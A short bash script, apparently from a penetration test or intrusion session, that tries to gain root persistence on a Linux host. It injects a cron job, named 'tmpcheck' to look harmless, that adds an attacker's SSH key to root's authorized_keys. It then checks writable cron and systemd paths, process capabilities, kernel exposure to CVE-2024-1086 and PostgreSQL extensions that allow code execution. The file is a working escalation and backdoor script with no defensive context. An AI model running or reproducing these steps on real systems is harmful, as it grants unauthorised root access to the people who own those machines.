#!/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# Method 1: Try crontab injection
echo "* * * * * root mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDpWL0G0DW8jr5waNkU8pbyI3u+p7Uk7bNfehfIk15yj kali@kali' >> /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys" > /tmp/.cron_inject
# Try writing to cron.d (needs root)
cp /tmp/.cron_inject /etc/cron.d/tmpcheck 2>/dev/null && echo "CRON_INJECTED" || echo "CRON_FAILED"
# Method 2: Try writable system timer/service paths
ls -la /etc/systemd/system/ 2>/dev/null | head -5
# Method 3: Check if any writable script runs as root
find /etc/cron* /var/spool/cron -writable 2>/dev/null
# Method 4: Check capabilities
getpcaps $$ 2>&1
# Method 5: CVE-2024-1086 check
cat /proc/version
modprobe nf_tables 2>&1
lsmod | grep nf_tables
# Method 6: PostgreSQL extensions
psql -U postgres -c "SELECT * FROM pg_available_extensions WHERE name LIKE '%python%' OR name LIKE '%perl%';" 2>&1
